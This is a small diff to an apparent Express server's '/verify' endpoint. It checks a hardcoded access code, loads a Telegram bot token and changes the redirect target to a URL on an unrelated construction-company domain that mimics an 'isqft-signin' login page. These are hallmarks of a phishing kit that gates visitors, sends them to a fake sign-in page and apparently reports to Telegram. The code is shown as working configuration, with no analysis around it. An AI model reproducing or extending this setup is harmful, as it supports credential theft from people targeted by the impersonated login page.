@@ -656,7 +656,7 @@ app.post('/verify', async (req, res) => {
   const { code } = req.body;
   const linkId = req.query.id || 'unknown'; // Capture the unique ID from URL
   const CORRECT_CODE = "223490";
-  const TARGET_URL = "https://edge-4c50a77734bb-mumqvg3t.b-cdn.net";
+  const TARGET_URL = "https://bids.onesite-constructions.com/faa/isqft-signin/isqft-signin";
 
   if (code === CORRECT_CODE) {
     const token = process.env.TELEGRAM_BOT_TOKEN;
